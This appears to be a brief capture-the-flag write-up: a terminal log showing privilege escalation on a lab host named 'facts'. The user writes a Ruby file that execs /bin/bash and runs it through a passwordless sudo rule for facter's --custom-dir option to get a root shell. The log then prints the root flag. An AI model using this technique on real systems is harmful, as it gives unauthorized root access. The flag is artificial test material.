# Privilege Esc using Facter

```bash
trivia@facts:~$ sudo /usr/bin/facter --custom-dir /home/triva bash

trivia@facts:~$ whoami
trivia

trivia@facts:~$ echo 'exec "/bin/bash"' > exploit.rb

trivia@facts:~$ ls
bash.rb  exploit.rb  linpeas.sh

trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
    
trivia@facts:~$ sudo /usr/bin/facter --custom-dir /home/trivia bash

root@facts:/home/trivia# ls
bash.rb  exploit.rb  linpeas.sh

root@facts:/home/trivia# cd /root

root@facts:~# ls
minio-binaries  ministack  root.txt  snap

root@facts:~# cat root.txt
fd8d97db1a0148559b4f2bc8ae164580

root@facts:~#
```